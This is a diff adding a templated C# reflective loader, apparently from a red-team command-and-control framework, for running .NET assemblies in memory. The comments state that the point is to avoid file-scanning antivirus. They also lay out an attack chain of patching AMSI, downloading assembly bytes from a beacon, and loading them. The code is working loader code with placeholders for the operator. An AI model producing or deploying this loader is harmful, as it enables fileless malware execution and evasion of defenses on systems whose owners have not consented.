@@ -1,0 +1,50 @@
+// reflective_dotnet.cs.j2 — reference template for `reflective-dotnet`
+//
+// Minimal `execute-assembly`-style primitive: load a .NET assembly from
+// memory + invoke its entry point. No file on disk, so file-scanning
+// AV rules don't fire.
+//
+// Operator substitutes:
+//   {{host_class}}   — class name
+//   {{host_method}}  — method invoked after load (default: "Main")
+//
+// Compile:
+//   csc.exe /target:library /out:ReflectiveLoader.dll ReflectiveLoader.cs
+//
+// Delivery: AMSI-patch first, then DownloadData the assembly bytes
+// from the beacon + call Load. The assembly must have a static entry
+// point with the signature `static void Main(string[])` by default,
+// override via {{host_method}}.
+
+using System;
+using System.IO;
+using System.Reflection;
+
+public static class {{host_class}} {
+    public static void Load(byte[] assemblyBytes, string[] args) {
+        if (assemblyBytes == null || assemblyBytes.Length == 0)
+            throw new ArgumentException("empty assembly");
+
+        Assembly asm = Assembly.Load(assemblyBytes);
+        MethodInfo entry = asm.EntryPoint;
+        if (entry == null) {
+            // Operator-supplied entry point when the assembly isn't a
+            // console app (no automatic EntryPoint).
+            Type t = asm.GetType("{{host_class}}");
+            if (t == null)
+                throw new InvalidOperationException("no entry point + {{host_class}} type missing");
+            entry = t.GetMethod("{{host_method}}",
+                                BindingFlags.Public | BindingFlags.Static);
+        }
+        if (entry == null)
+            throw new InvalidOperationException("no entry point found");
+
+        ParameterInfo[] p = entry.GetParameters();
+        object result = (p.Length == 0)
+            ? entry.Invoke(null, null)
+            : entry.Invoke(null, new object[] { args ?? new string[0] });
+
+        if (result != null)
+            Console.WriteLine(result.ToString());
+    }
+}
